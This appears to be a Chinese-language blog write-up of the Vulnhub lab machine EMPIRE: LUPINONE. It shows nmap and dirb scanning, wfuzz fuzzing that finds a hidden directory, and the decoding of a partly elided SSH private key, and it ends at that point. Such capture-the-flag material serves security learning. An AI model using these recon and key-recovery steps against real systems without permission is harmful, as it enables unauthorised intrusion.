---
layout: post
title: "EMPIRE: LUPINONE"
subtitle: "EMPIRE: LUPINONE"
date: 2022-12-08 14:37
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - Vulnhub
---
## EMPIRE: LUPINONE

Difficulty: Medium

kali攻击机ip:192.168.30.130

靶机ip:192.168.30.135

### 网络扫描

```shell
nmap -A 192.168.30.135
```

开放22、80端口，扫描文件

```shell
dirb 192.168.30.135 
```

发现robots.txt，内容：

```
User-agent: *
Disallow: /~myfiles
```

```html
curl http://192.168.30.135/~myfiles/

##
<!DOCTYPE html>
<html>
<head>
<title>Error 404</title>
</head>
<body>

<h1>Error 404</h1>

</body>
</html>

<!-- Your can do it, keep trying. -->
```

查找其他目录下\~myfiles文件，无果。查找和\~myfiles文件格式类似文件

```shell
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.30.135/~FUZZ
```

找到\~secret,code:301。使用浏览器访问

```
Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,
Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
I'm smart I know that.
Any problem let me know
Your best friend icex64 
```

Tps：用户名：icex64，sshkey

```
cGxD6KNZQddY6iCsSuqPzU......zDgKm2gSRN8gHz3WqS
```

base58解码：

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEA......4ORlsC
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
```